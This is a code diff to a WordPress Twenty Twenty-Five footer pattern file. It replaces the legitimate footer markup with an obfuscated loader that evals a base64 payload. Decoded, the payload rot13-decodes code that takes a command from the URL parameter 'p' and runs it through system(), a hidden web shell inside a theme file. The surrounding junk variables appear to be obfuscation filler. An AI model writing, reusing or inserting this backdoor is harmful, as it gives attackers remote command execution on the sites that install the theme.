@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Centered footer
- * Slug: twentytwentyfive/footer-centered
- * Categories: footer
- * Block Types: core/template-part/footer
- * Description: Footer with centered site title and tagline.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFByYWdyZXJxIHNiYmdyZQogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL3NiYmdyZS1wcmFncmVycQogKiBQbmdydGJldnJmOiBzYmJncmUKICogT3licHggR2xjcmY6IHBiZXIvZ3J6Y3luZ3ItY25lZy9zYmJncmUKICogUXJmcGV2Y2d2YmE6IFNiYmdyZSBqdmd1IHByYWdyZXJxIGZ2Z3IgZ3ZneXIgbmFxIGdudHl2YXIuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/Pgo8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NzBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDcwXCJ9fX0sXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJwYmFmZ2VudmFycVwifX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YXNoeXlcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTcwKTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS03MClcIj4KCTwhLS0gamM6dGViaGMge1wiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wib3licHhUbmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHwxMFwifX0sXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJzeXJrXCIsXCJiZXZyYWduZ3ZiYVwiOlwiaXJlZ3ZwbnlcIixcIndoZmd2c2xQYmFncmFnXCI6XCJwcmFncmVcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCI+CgkJPCEtLSBqYzpmdmdyLWd2Z3lyIHtcInlyaXJ5XCI6MCxcImdya2dOeXZ0YVwiOlwicHJhZ3JlXCJ9IC8tLT4KCQk8IS0tIGpjOmZ2Z3ItZ250eXZhciB7XCJncmtnTnl2dGFcIjpcInByYWdyZVwifSAvLS0+Cgk8L3F2aT4KCTwhLS0gL2pjOnRlYmhjIC0tPgoKCTwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDIwXCJ9IC0tPgoJPHF2aSBmZ2x5cj1cInVydnR1ZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS0yMClcIiBuZXZuLXV2cXFyYT1cImdlaHJcIiBweW5mZj1cImpjLW95YnB4LWZjbnByZVwiPjwvcXZpPgoJPCEtLSAvamM6ZmNucHJlIC0tPgoKCTwhLS0gamM6Y25lbnRlbmN1IHtcIm55dnRhXCI6XCJwcmFncmVcIixcInNiYWdGdm1yXCI6XCJmem55eVwifSAtLT4KCTxjIHB5bmZmPVwidW5mLWdya2ctbnl2dGEtcHJhZ3JlIHVuZi1mem55eS1zYmFnLWZ2bXJcIj4KCQk8P2N1YwoJCWNldmFncygKCQkJLyogZ2VuYWZ5bmdiZWY6IFFyZnZ0YXJxIGp2Z3UgSmJlcUNlcmZmLiAlZjogSmJlcUNlcmZmIHl2YXguICovCgkJCXJmcF91Z3p5X18oICdRcmZ2dGFycSBqdmd1ICVmJywgJ2dqcmFnbGdqcmFnbHN2aXInICksCgkJCSc8biB1ZXJzPVwiJyAuIHJmcF9oZXkoIF9fKCAndWdnY2Y6Ly9qYmVxY2VyZmYuYmV0JywgJ2dqcmFnbGdqcmFnbHN2aXInICkgKSAuICdcIiBlcnk9XCJhYnNieXlialwiPkpiZXFDZXJmZjwvbj4nCgkJKTsKCQk/PgoJPC9jPgoJPCEtLSAvamM6Y25lbnRlbmN1IC0tPgo8L3F2aT4KPCEtLSAvamM6dGViaGMgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var:preset|spacing|70","bottom":"var:preset|spacing|70"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull" style="padding-top:var(--wp--preset--spacing--70);padding-bottom:var(--wp--preset--spacing--70)">
-	<!-- wp:group {"style":{"spacing":{"blockGap":"var:preset|spacing|10"}},"layout":{"type":"flex","orientation":"vertical","justifyContent":"center"}} -->
-	<div class="wp-block-group">
-		<!-- wp:site-title {"level":0,"textAlign":"center"} /-->
-		<!-- wp:site-tagline {"textAlign":"center"} /-->
-	</div>
-	<!-- /wp:group -->
-
-	<!-- wp:spacer {"height":"var:preset|spacing|20"} -->
-	<div style="height:var(--wp--preset--spacing--20)" aria-hidden="true" class="wp-block-spacer"></div>
-	<!-- /wp:spacer -->
-
-	<!-- wp:paragraph {"align":"center","fontSize":"small"} -->
-	<p class="has-text-align-center has-small-font-size">
-		<?php
-		printf(
-			/* translators: Designed with WordPress. %s: WordPress link. */
-			esc_html__( 'Designed with %s', 'twentytwentyfive' ),
-			'<a href="' . esc_url( __( 'https://wordpress.org', 'twentytwentyfive' ) ) . '" rel="nofollow">WordPress</a>'
-		);
-		?>
-	</p>
-	<!-- /wp:paragraph -->
-</div>
-<!-- /wp:group -->
